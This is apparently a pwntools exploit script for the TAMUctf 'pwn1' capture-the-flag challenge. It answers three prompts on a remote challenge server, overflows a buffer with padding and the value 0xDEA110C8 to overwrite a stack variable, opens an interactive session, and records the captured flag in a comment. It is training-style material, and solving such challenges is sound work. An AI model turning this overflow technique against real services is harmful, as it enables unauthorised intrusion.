from pwn import *


DEBUG = 0
if DEBUG:
     p = process('./pwn1')
     e = ELF('./pwn1')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     #libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
     #ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so') 
    
else:
     p = remote('pwn.tamuctf.com', 4321)
     #libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')


def pwn():
    
    p.recvuntil('name?')
    p.sendline('Sir Lancelot of Camelot')
    p.recvuntil('is your quest?')
    p.sendline('To seek the Holy Grail.')
    p.recvuntil('secret?')
    stri='a'*0x2b+p32(0xDEA110C8)
    p.sendline(stri)
   
    
    p.interactive()

if __name__ == '__main__':
   pwn()

#gigem{34sy_CC428ECD75A0D392}

